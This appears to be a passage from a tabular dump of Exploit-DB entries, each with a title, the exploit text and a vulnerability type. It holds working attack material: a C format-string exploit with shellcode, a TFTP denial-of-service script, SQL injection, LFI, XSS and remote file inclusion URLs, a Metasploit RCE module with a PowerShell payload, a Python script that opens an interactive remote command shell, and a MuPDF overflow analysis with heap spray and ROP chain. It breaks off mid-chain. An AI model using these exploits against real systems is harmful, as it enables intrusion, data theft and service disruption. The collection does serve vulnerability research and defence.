 unsigned long dtors=target[pf].dtors_addr;  char filler[][4]={"""",""X"",""XX"",""XXX""};  char taddr[3];  char *buf;  char *exec=target[pf].exec;   taddr[0]=(dtors&0xff000000)>>24;  taddr[1]=(dtors&0x00ff0000)>>16;  taddr[2]=(dtors&0x0000ff00)>>8;  taddr[3]=(dtors&0x000000ff);   if(!(buf=(char *)malloc(strlen(exec)+align+  NOP_AMT+11)))   printe(""getfmtmem(): allocating memory failed"");   bzero(buf,(strlen(exec)+align+NOP_AMT+11));  sprintf(buf,""X%s=%c%c%c%c%c%c%c%c"",   filler[align],   taddr[3]+2,taddr[2],taddr[1],taddr[0],   taddr[3],taddr[2],taddr[1],taddr[0]);   memset(buf+(10+align),0x90,NOP_AMT);  memcpy(buf+((10+align+NOP_AMT)-strlen(exec)),  exec,strlen(exec));   return(buf); } char *setlang(unsigned int pf){  char *langfile;  char *langsrc;  char *execbuf;  char *envbuf;  struct passwd *pwd;  FILE *fs;   if(!(pwd=getpwuid(getuid())))   printe(""passwd entry doesn't appear to exist"");  else{   if(strlen(pwd->pw_dir)){    if(!(langfile=(char *)malloc(strlen((char *)    pwd->pw_dir)+strlen(LANG_NAME)+7)))     printe(""setlang(): allocating memory failed"");    sprintf(langfile,""%s/mess.%s"",(char *)pwd->pw_dir,    LANG_NAME);   }   else    printe(""passwd entry lookup failure"");  }  if(!(langsrc=(char *)malloc(strlen(langfile)+5)))   printe(""setlang(): allocating memory failed"");   sprintf(langsrc,""%s.src"",langfile);   if(!(fs=fopen(langsrc,""w"")))   printe(""setlang(): failed to write to cat file."");  fs=fopen(langsrc,""w"");  fprintf(fs,""%s\n"",setfmt(pf));  fclose(fs);   if(!(execbuf=(char *)malloc(strlen(langfile)+  strlen(langsrc)+9)))   printe(""setlang(): allocating memory failed"");  sprintf(execbuf,""gencat %s %s"",langfile,langsrc);   unlink(langfile);  system(execbuf);   if(!(envbuf=(char *)malloc(strlen(langfile)+9)))   printe(""setlang(): allocating memory failed"");  sprintf(envbuf,""NLSPATH=%s"",langfile);   free(langfile);  free(langsrc);  free(execbuf);   return(envbuf); } void printe(char *err){  fprintf(stderr,""error: %s.\n"",err);  exit(0); }",Catalog File Format String,1
9528,"TFTPUtil GUI 1.3.0 - Remote Denial of Service #!/usr/bin/python  import socket import sys from time import *  #Download:http://www.brothersoft.com/tftputil-131537.html #Note; Good Ramadan For all MuSLimS if len(sys.argv)!=2:  print ""[x]TFTPUtil GUI 1.3.0 GUI Remote Denial Of Service Exploit""  print ""[x]Author : ThE g0bL!N""  print ""[x]Big Thanx : His0k4\n""  print ""[+]Usage: %s <target_ip>"" %sys.argv[0]  sys.exit(0)  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  mode = ""\x41""*384  filename = ""test""  payload = ""\x00\x01"" + filename + ""\x00"" + mode + ""\x00""  print ""[x] Sending the payload..."" sleep(2) s.sendto(payload, (sys.argv[1], 69)) print ""[x] Done!""  # milw0rm.com [2009-08-26]",Remote Denial of Service,1
25479,"DUportal Pro 3.4 - 'result.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/13285/info     DUportal Pro is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.     A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.     These vulnerabilities are reported to affect DUportal Pro 3.4; earlier versions may also be affected.   http://www.example.com/dUpro/Businesses/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/Businesses/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Classifieds/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/Classifieds/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Events/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/events/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/Events/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/events/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Files/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/Files/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/home/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/home/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Pictures/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/Pictures/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/polls/../polls/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/polls/../polls/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Topics/../polls/result.asp?iData=74&iCat=254&iChannel=&#039;SQL_INJECTION&nChannel=Polls http://www.example.com/dUpro/Topics/../polls/result.asp?iData=&#039;SQL_INJECTION&iCat=254&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Businesses/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/Businesses/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Classifieds/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/Classifieds/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Events/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/events/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/Events/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/events/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Files/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/Files/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/home/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/home/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Pictures/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/Pictures/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/polls/../polls/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/polls/../polls/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls http://www.example.com/dUpro/Topics/../polls/result.asp?iData=74&iCat=254&iChannel=15&nChannel=&#039;SQL_ERRORS http://www.example.com/dUpro/Topics/../polls/result.asp?iData=74&iCat=&#039;SQL_ERRORS&iChannel=15&nChannel=Polls",SQL-injection,1
43493,"HPE iMC - dbman 'RestartDB' Remote Command Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::Tcp   include Msf::Exploit::Powershell    def initialize(info = {})     super(update_info(info,       'Name'           => 'HPE iMC dbman RestartDB Unauthenticated RCE',       'Description'    => %q{         This module exploits a remote command execution vulnerablity in         Hewlett Packard Enterprise Intelligent Management Center before         version 7.3 E0504P04.          The dbman service allows unauthenticated remote users to restart         a user-specified database instance (OpCode 10008), however the         instance ID is not sanitized, allowing execution of arbitrary         operating system commands as SYSTEM. This service listens on         TCP port 2810 by default.          This module has been tested successfully on iMC PLAT v7.2 (E0403)         on Windows 7 SP1 (EN).       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'sztivi', # Discovery           'Chris Lyne', # Python PoC (@lynerc)           'Brendan Coles <bcoles[at]gmail.com>' # Metasploit         ],       'References'     =>         [           ['CVE', '2017-5816'],           ['EDB', '43198'],           ['ZDI', '17-340'],           ['URL', 'https://www.securityfocus.com/bid/98469/info'],           ['URL', 'https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us']         ],       'Platform'       => 'win',       'Targets'        => [['Automatic', {}]],       'Payload'        => { 'BadChars' => ""\x00"" },       'DefaultOptions' => { 'WfsDelay' => 15 },       'Privileged'     => true,       'DisclosureDate' => 'May 15 2017',       'DefaultTarget'  => 0))     register_options [Opt::RPORT(2810)]   end    def check     # empty RestartDB packet     pkt = [10008].pack('N')      connect     sock.put pkt     res = sock.get_once     disconnect      # Expected reply:     # ""\x00\x00\x00\x01\x00\x00\x00:08\x02\x01\xFF\x043Dbman deal msg error, please to see dbman_debug.log""     return CheckCode::Detected if res =~ /dbman/i      CheckCode::Safe   end    def dbman_msg(db_instance)     data = ''      db_ip = ""#{rand(255)}.#{rand(255)}.#{rand(255)}.#{rand(255)}""     db_type = ""\x04"" # SQL Server     db_sa_username = rand_text_alpha rand(1..5)     db_sa_password = rand_text_alpha rand(1..5)     ora_db_ins = rand_text_alpha rand(1..5)      # dbIp     data << ""\x04""     data << [db_ip.length].pack('C')     data << db_ip      # iDBType     data << ""\x02""     data << [db_type.length].pack('C')     data << db_type      # dbInstance     data << ""\x04""     data << ""\x82""     data << [db_instance.length].pack('n')     data << db_instance      # dbSaUserName     data << ""\x04""     data << [db_sa_username.length].pack('C')     data << db_sa_username      # dbSaPassword     data << ""\x04""     data << [db_sa_password.length].pack('C')     data << db_sa_password      # strOraDbIns     data << ""\x04""     data << [ora_db_ins.length].pack('C')     data << ora_db_ins      data   end    def dbman_restartdb_pkt(db_instance)     data = dbman_msg db_instance      # opcode 10008 (RestartDB)     pkt = [10008].pack('N')      # packet length     pkt << ""\x00\x00""     pkt << [data.length + 4].pack('n')      # packet data length     pkt << ""\x30\x82""     pkt << [data.length].pack('n')      # packet data     pkt << data      pkt   end    def execute_command(cmd, _opts = {})     connect     sock.put dbman_restartdb_pkt ""\""& #{cmd} &""     disconnect   end    def exploit     command = cmd_psh_payload(       payload.encoded,       payload_instance.arch.first,       { :remove_comspec => true, :encode_final_payload => true }     )      if command.length > 8000       fail_with Failure::BadConfig, ""#{peer} - The selected payload is too long to execute through Powershell in one command""     end      print_status ""Sending payload (#{command.length} bytes)...""     execute_command command   end end",Remote Command Execution,1
5309,"BolinOS 4.6.1 - Local File Inclusion / Cross-Site Scripting Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-022   Application:                    BolinOS Versions Affected:              4.6.1 Vendor URL:                     http://www.bolinos.com Bugs:                           Local File Include,Multiple XSS,  System information disclosure Exploits:                       YES Reported:                       13.03.2008 Second report:                  18.03.2008 Vendor response:                none Solution:                       none Date of Public Advisory:        25.03.2008 Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)    Description ***********  BolinOS system has multiple security vulnerabilities:  1. Local File Include 2. Multiple Linked XSS vulnerabilities 3. Multiple XSS in POST 4. System information disclosure    Details *******  1. Local File Include vulnerability found in system/_b/contentFiles/gbincluder.php   Code **** #################################################  $actionpagetoinclude=$_GET[""_bFileToInclude""]; if($actionpagetoinclude!="""" && @file_exists(gBRootPath.""/$actionpagetoinclude"")){    @include(gBRootPath.""/$actionpagetoinclude"");    } else{    echo ""NO FILE"";   }  #################################################  Example:  http://[server]/[installdir]/system/_b/contentFiles/gbincluder.php?_bFileToInclude=../../../../../../../../../../../../../etc/passwd  ---------------------------------------------------------------------   2. Multiple linked XSS vulnerabilities found.  2.1 Linked XSS vulnerability found in page /system/actionspages/_b/contentFiles/gBImageViewer.php  Attacker can inject XSS in GET parameter ""url""  Example:  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBImageViewer.php?url=<script>alert('DSecRG XSS')</script>   2.2 Linked XSS vulnerability found in page /system/actionspages/_b/contentFiles/gBselectorContents.php  Attacker can inject XSS in GET parameter ""ForEditor"".  Example:  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBselectorContents.php?ForEditor='><IMG%20SRC=""javascript:alert('DSecRG XSS')"">   2.3 Linked XSS vulnerabilities found in following pages:  /system/actionspages/_b/contentFiles/gBLoginPage.php /system/actionspages/_b/contentFiles/gBPassword.php  Attacker can inject XSS script in URL  Example:  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBLoginPage.php/""><script>alert('DSecRG XSS')</script> http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBPassword.php/""><script>alert('DSecRG XSS')</script>  ---------------------------------------------------------------------   3. Multiple XSS in POST vulnerabilities, attacker can inject XSS in POST parameter.  3.1 Vulnerability found in script /system/actionspages/_b/contentFiles/gBLoginPage.php  POST parameter ""formlogin"".  Example:  POST /bolinos/system/actionspages/_b/contentFiles/gBLoginPage.php?bAddress=bolinos.sessions HTTP/1.0 Content-Length: 81 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; DS; .NET CLR 2.0.50727)  formlogin=%27><img%20src%3d%22javascript:alert(%27DSecRG%20XSS%27)%22>&BtLogin.x=   3.2 Vulnerability found in page /help/index.php  POST parameter ""bolini_searchengine46Search"".  Example:  bolini_searchengine46Search = '><IMG SRC=javascript:alert(""DSecRG&#x20;XSS"")>  --------------------------------------------------------------------   4. System information disclosure  Non-authentication user can access phpinfo() page.  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBphpInfo.php    About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:        research [at] dsec [dot] ru                 http://www.dsec.ru (in Russian)  # milw0rm.com [2008-03-25]",information disclosure,1
38593,"FtpLocate - HTML Injection source: https://www.securityfocus.com/bid/60760/info  FtpLocate is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.  Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.  FtpLocate 2.02 is vulnerable; other versions may also be affected.   http://www.example.com/cgi-bin/ftplocate/flsearch.pl?query=FTP&fsite=<script>alert('xss')</script>",HTML Injection,1
10341,SiSplet CMS 2008-01-24 - Multiple Remote File Inclusions ######################################################################## #SiSplet CMS <= 2008-01-24 Multiple Remote File Include Exploit ########################################################################  ######################################################################## 3rr0r 1: ./SiSplet-2008-01-24/main/anketa/new.php (line 3)         <?php            require_once($site_path.'main/anketa/class.php');        ?>  3rr0r 2: ./SiSplet-2008-01-24/main/forum/komentar.php (line 3)         <?php            require($site_path.'main/forum/class.php');        ?> ########################################################################  ######################################################################## PoC  :   http://[target]/[path]/main/anketa/new.php?site_path=[Shell]          http://[target]/[path]/main/forum/komentar.php?site_path=[Shell] ########################################################################  ######################################################################## #Contact Me : cr4wl3r[4t]linuxmail[dot]org,Remote File Inclusions,1
24596,QNX Photon pkg-installer - '-s' Overflow source: https://www.securityfocus.com/bid/11164/info    Reportedly QNX Photon MicroGUI is affected by multiple buffer overflow vulnerabilities in MicroGUI utilities. These issues are due to a failure of the affected applications to validate user-supplied string lengths before copying them into finite process buffers.    An attacker may leverage these issues to execute arbitrary code on the affected system within the context of the vulnerable applications; the applications are typically setuid applications.  $ /usr/photon/bin/pkg-installer -s AAAAA[...],multiple buffer overflow,1
33070,"ApPHP MicroBlog 1.0.1 - Remote Command Execution #!/usr/bin/python import random import hashlib import urllib from base64 import b64encode as b64 import sys import re  # Exploit Title: Python exploit for ApPHP MicroBlog 1.0.1 (Free Version) - RCE # Exploit Author: LOTFREE # Version: ApPHP MicroBlog 1.0.1 (Free Version) # EDB-ID: 33030  print ""  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-"" print ""original exploit by Jiko : http://www.exploit-db.com/exploits/33030/""  if len(sys.argv) < 2:     print ""Usage: python {0} http://target/blog/index.php"".format(sys.argv[0])     sys.exit()  debug = False CHECK_FMT = ""{0}?{1});echo(base64_decode('{2}')=/"" INFO_FMT = ""{0}?{1});echo(base64_decode('{2}'));phpinfo();echo(base64_decode('{3}')=/"" # to read include/base.inc.php CONFIG_FMT = ""{0}?{1});echo(base64_decode('{2}'));readfile(base64_decode('aW5jbHVkZS9iYXNlLmluYy5waHA%3D'));echo(base64_decode('{3}')=/"" EXEC_FMT = ""{0}?{1});echo(base64_decode('{2}'));{3}(base64_decode('{4}'));echo(base64_decode('{5}')=/"" index_url = sys.argv[1]  char = chr(random.randint(97,122)) start_mark = hashlib.md5(str(random.random())).hexdigest()[:15] end_mark = hashlib.md5(str(random.random())).hexdigest()[:15]  print ""[*] Testing for vulnerability..."" random_mark = hashlib.md5(str(random.random())).hexdigest()[:15] url = CHECK_FMT.format(index_url, char, b64(random_mark)) if debug:     print url r = urllib.urlopen(url) if not random_mark in r.read():     print ""[-] Website is not vulnerable :'(""     sys.exit()  print ""[+] Website is vulnerable"" print  def extract_between(data):     global start_mark     global end_mark      if start_mark not in data or end_mark not in data:         print ""[-] Oops. Something went wrong :(""         return """"      return data.split(start_mark, 1)[1].split(end_mark, 1)[0]  print ""[*] Fecthing phpinfo"" url = INFO_FMT.format(index_url, char, b64(start_mark), b64(end_mark)) if debug:     print url r = urllib.urlopen(url) output = extract_between(r.read()) output = re.compile(r'<[^<]*?/?>').sub(' ', output)  interesting_values = [     ""PHP Version"",     ""System"",     ""Loaded Configuration File"",     ""Apache Version"",     ""Server Root"",     ""DOCUMENT_ROOT"",     ""allow_url_"",     ""disable_functions"",     ""open_basedir"",     ""safe_mode"",     ""User/Group""]  for line in output.split(""\n""):     line = line.strip()     if line:         for value in interesting_values:             if line.startswith(value):                 print ""\t"" + line print  print ""[*] Fetching include/base.inc.php"" url = CONFIG_FMT.format(index_url, char, b64(start_mark), b64(end_mark)) if debug:     print url r = urllib.urlopen(url) output = extract_between(r.read()) print output print  exec_functions = [""system"", ""passthru"", ""exec"", ""shell_exec""] valid_exec = None print ""[*] Testing remote execution"" for func in exec_functions:     # trying to exec ""echo LOTFREE""     url = EXEC_FMT.format(index_url, char, b64(start_mark), func, ""ZWNobyBMT1RGUkVF"", b64(end_mark))     if debug:         print url     r = urllib.urlopen(url)     output = extract_between(r.read())     if ""LOTFREE"" in output:         valid_exec = func         break  if valid_exec is None:     print ""[-] Did not manage to execute commands :(""     sys.exit()  print ""[+] Remote exec is working with {0}() :)"".format(valid_exec) print ""Submit your commands, type exit to quit"" while True:     try:         cmd = raw_input(""> "").strip()     except EOFError:         print         break     if cmd == ""exit"":         print         break     if (len(cmd) % 3) > 0:         padding = "" "" * (3 - len(cmd) % 3)         cmd = cmd + padding     url = EXEC_FMT.format(index_url, char, b64(start_mark), func, b64(cmd), b64(end_mark))     if debug:         print url     r = urllib.urlopen(url)     output = extract_between(r.read())     print output     print",Remote Command Execution,1
31090,"MuPDF 1.3 - 'xps_parse_color()' Stack Buffer Overflow ============================================================= 0day - MuPDF Stack-based Buffer Overflow in xps_parse_color() ============================================================= # Date of discovery: 2013-01-26 # Software Links: http://www.mupdf.com/ ; http://en.wikipedia.org/wiki/MuPDF # Version: <= 1.3 # Author: Jean-Jamil Khalife # Tested on: Windows XP SP3 (fr) / Windows 7 x64 (fr) # Home: http://www.hdwsec.fr # Blog : http://www.hdwsec.fr/blog.html  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/31090.xps  Description : ============== This vulnerability leads to a remote code execution when a user opens a malicious XPS document.   Disclosure Timeline : ===================== 2014-01-16 MuPDF contacted 2014-01-18 fix integrated   Analysis : ========== When MuPDF loads the XPS document, it loads the first page and parses each element via xps_parse_element() as detailed in the XPS specification ( http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-388.pdf ), When the crash occurs, the call stack looks like this :  <code> mupdf.exe!xps_parse_path mupdf.exe!xps_parse_element mupdf.exe!xps_parse_fixed_page mupdf.exe!xps_run_page mupdf.exe!fz_run_page_contents mupdf.exe!pdfapp_loadpage </code>  <code> void xps_parse_element(xps_document *doc, const fz_matrix *ctm, const fz_rect *area, char *base_uri, xps_resource *dict, fz_xml *node ) { ............. if (!strcmp(fz_xml_tag(node), ""Path"")) xps_parse_path(doc, ctm, base_uri, dict, node); if (!strcmp(fz_xml_tag(node), ""Glyphs"")) xps_parse_glyphs(doc, ctm, base_uri, dict, node); ............. } </code>  In this case, the Path element is parsed via the xps_parse_path() function which allows extraction of the attributes and extended attributes (Clip, Data, Fill, ...). If some conditions are fulfilled, we can trigger a stack overflow in the xps_parse_color() function when it parses the value ""ContextColor"" of the attribute ""Fill"".  <code> void xps_parse_path(xps_document *doc, const fz_matrix *ctm, char *base_uri, xps_resource *dict, fz_xml *root) { fz_stroke_state *stroke = NULL; fz_matrix transform; float samples[32]; fz_colorspace *colorspace; fz_path *path; fz_path *stroke_path = NULL; fz_rect area; int fill_rule; int dash_len = 0; fz_matrix local_ctm; ....... fill_att = fz_xml_att(root, ""Fill""); ....... if (fill_att) { xps_parse_color(doc, base_uri, fill_att, &colorspace, samples); if (fill_opacity_att) samples[0] *= fz_atof(fill_opacity_att); xps_set_color(doc, colorspace, samples);  fz_fill_path(doc->dev, path, fill_rule == 0, &local_ctm, doc->colorspace, doc->color, doc->alpha); } ....... } </code>  This function is in charge of getting all the floating numbers of ContextColor and putting them into the samples[32] buffer. The issue is that it does it without controlling the size of this array.  <code> void xps_parse_color(xps_document *doc, char *base_uri, char *string, fz_colorspace **csp, float *samples) { ............. else if (strstr(string, ""ContextColor "") == string) { fz_strlcpy(buf, string, sizeof buf); profile = strchr(buf, ' '); if (!profile) { fz_warn(doc->ctx, ""cannot find icc profile uri in '%s'"", string); return; } *profile++ = 0; p = strchr(profile, ' '); if (!p) { fz_warn(doc->ctx, ""cannot find component values in '%s'"", profile); return; } *p++ = 0; n = count_commas(p) + 1; i = 0; while (i < n) { samples[i++] = fz_atof(p); p = strchr(p, ','); if (!p) break; p ++; if (*p == ' ') p ++; } } ............. } </code>  This is the assembly code from the compiled C code above : <code> .text:0047C590 loc_47C590: .text:0047C590 push esi ; char * .text:0047C591 call fz_atof // convert into float .text:0047C596 fstp dword ptr [edi+ebx*4] .text:0047C599 add esp, 4 .text:0047C59C push 2Ch ; int .text:0047C59E push esi ; char * .text:0047C59F add ebx, 1 .text:0047C5A2 call _strchr // search next comma .text:0047C5A7 mov esi, eax .text:0047C5A9 add esp, 8 .text:0047C5AC test esi, esi // check if the returned pointer is null .text:0047C5AE jz short loc_47C5C1 .text:0047C5B0 add esi, 1 .text:0047C5B3 cmp byte ptr [esi], 20h // trim potential space .text:0047C5B6 jnz short loc_47C5BB .text:0047C5B8 add esi, 1 .text:0047C5BB .text:0047C5BB loc_47C5BB: .text:0047C5BB cmp ebx, ebp // check only the number of comma (oops... no test for the samples size) .text:0047C5BD jl short loc_47C590 </code>  This is an example of a proof-of-concept test case that triggers the overflow : <code> <FixedPage Width=""793.76"" Height=""1122.56"" xmlns=""http://schemas.microsoft.com/xps/2005/06"" xml:lang=""und""> <Path Data="""" Fill=""ContextColor 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47"" /> </FixedPage> </code>  Exploitation : ============== I decided to use the latest version of the executable provided on the official website. Software : MuPDF v1.3 Tested on : Windows XP SP3 (fr) / Windows 7 x64 (fr)  1) It doesn't matter if the executable is compiled with /GS (this is the case on mupdf.exe). The reason is that the stack concerns a float array and an old version of Visual Studio doesn't add security cookies in this case. If it was the case the vulnerability would be more difficult to exploit. We can't erase the SEH because of the small stack buffer but depending on the concerned software, it maybe possible to replace interesting variables or structures values to control the EIP.  2) Given that samples is a float array, we have to make our payload fit into an array of floats. The size of the temporary buffer is limited to 0x400 bytes as can be seen in fz_strlcpy(...). As said above, we have to make our payload fit into an array of floats. For this reason it's important that each float has a long ansi size (about 22 bytes), otherwise it could be not precise enough to get the real 4-bytes values. So, 1024 / 22 = 46 * 4 bytes = 184 bytes (not enough to put our shellcode). Here is an example : <FixedPage Width=""793.76"" Height=""1122.56"" xmlns=""http://schemas.microsoft.com/xps/2005/06"" xml:lang=""und""> <Path Data="""" Fill=""ContextColor 7.738695572473460e+033,7.738695572473460e+033,7.813604562190658e+033,7.188661121986312e-043,7.861639730565029e+033,8.968310171678829e-044, ...... and so on. /> </FixedPage>  3) We need to write our shellcode into the heap, so maybe we could put a stack pivot to return at the beginning of the stack buffer, process the ROP chain and then do an egg hunter to execute the shellcode from the heap but there is a much nicer solution. It's possible to trigger multiple aligned allocations into the heap, even if we can't use javascript scripting routine. I used the ""font"" attribute to allocate binary data, controlling the size for each of them else it's not possible to make precise allocations. So we can now put the ROP and shellcode directly at 0x0c0c0c0c. If we take a look at the assembly code, the functions displayed below are used to do most of the allocations of elements and resources :  <code> .text:00421BCC loc_421BCC: .text:00421BCC mov edi, [esp+18h] .text:00421BD0 mov eax, [esi+44h] .text:00421BD3 call sub_40F730 .text:00421BD8 mov edi, [esp+1Ch] .text:00421BDC lea ebx, [edi+1] // ebx = 0x100000 (1mo) .text:00421BDF test ebx, ebx // check the size .text:00421BE1 mov [ebp+0], eax .text:00421BE4 mov [ebp+4], edi .text:00421BE7 mov esi, [esi+44h] .text:00421BEA jnz short loc_421BFD .text:00421BEC xor eax, eax .text:00421BEE .text:00421BEE loc_421BEE: ; CODE XREF: .text:00421C06_j  .......  .text:00421BFD .text:00421BFD loc_421BFD: ; CODE XREF: .text:00421BEA_j .text:00421BFD mov eax, esi .text:00421BFF call do_scavenging_malloc // go malloc .text:00421C04 test eax, eax .text:00421C06 jnz short loc_421BEE .text:00421C08 push ebx .text:00421C09 push offset aMallocOfDBytes ; ""malloc of %d bytes failed"" .text:00421C0E lea ecx, [eax+1] .text:00421C11 call sub_40FAD0 </code>  No particular check is made except if the size is null or zero. Obviously, if it's zero, the function returns null. ebx contains the size of our block (0x100000).  <code> .text:0040F450 do_scavenging_malloc proc near .text:0040F450 push ecx .text:0040F451 push esi ...  .text:0040F470 .text:0040F470 loc_40F470: .text:0040F470 mov eax, [esi] .text:0040F472 mov ecx, [eax] .text:0040F474 mov edx, [eax+4] // & _sub_40F7A0() .text:0040F477 push ebx // size = 0x100000 .text:0040F478 push ecx .text:0040F479 call edx // call _sub_40F7A0() </code>  As we can see, __cdecl sub_40F7A0 is dynamically resolved and then called with the size argument filled in ebx before.  <code> .text:0040F7A0 ; int __cdecl sub_40F7A0(int, size_t) .text:0040F7A0 .text:0040F7A0 mov eax, [esp+arg_4] .text:0040F7A4 push eax ; size_t .text:0040F7A5 call _malloc // do HeapAlloc() of our font size .text:0040F7AA add esp, 4 .text:0040F7AD retn .text:0040F7AD sub_40F7A0 endp </code>  Finally, our font allocations are done and will remain without being freed. Practically, we need to generate many font files containing our binary data into a folder and write the path of each of them into the page file using FontUri attribute of Glyphs like shown below to load them.  <code> <FixedPage Width=""793.76"" Height=""1122.56"" xmlns=""http://schemas.microsoft.com/xps/2005/06"" xml:lang=""und""> <Glyphs OriginX=""96"" OriginY=""96"" UnicodeString=""This is Page 1!"" FontUri=""/Documents/1/Resources/Fonts/FONT-0.ttf"" FontRenderingEmSize=""16""/> <Glyphs OriginX=""96"" OriginY=""96"" UnicodeString=""This is Page 1!"" FontUri=""/Documents/1/Resources/Fonts/FONT-1.ttf"" FontRenderingEmSize=""16""/> <Glyphs OriginX=""96"" OriginY=""96"" UnicodeString=""This is Page 1!"" FontUri=""/Documents/1/Resources/Fonts/FONT-2.ttf"" FontRenderingEmSize=""16""/> ... <Path Data="""" Fill=""ContextColor 5.962129799535157e-039,7.421697056603529e-039,7.334452214214666e-039, ... /> </FixedPage>  </code> 4)It now only remains to find a solution to bypass DEP. ASLR can be bypassed in this case because mupdf.exe isn't ASLR compiled. * A stack pivot will allow executing the ROP from the heap <code> 0x005000a7 : # XOR EAX,EAX # POP ESI # RETN 0x0C0C0C0C : 0x0C0C0C0C 0x00453eaa : # ADD EAX,ESI # POP ESI # POP ECX # RETN 0x0C0C0C0C : 0x0C0C0C0C 0x0C0C0C0C : 0x0C0C0C0C 0x0047033d : # XCHG EAX,ESP # POP EBP # POP ESI # POP EBX # RETN </code>  * The ROP chain is based on mupdf.exe (which is non-ASLR). In this case, it appears that only VirtualAlloc is necessary to bypass DEP. <code> 0x0040ebfe, # POP EAX # RETN 0x0050d0ac, # ptr to &VirtualAlloc() 0x004fdd78, # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # RETN 0x41414141, # Filler (compensate) 0x00408e96, # XCHG 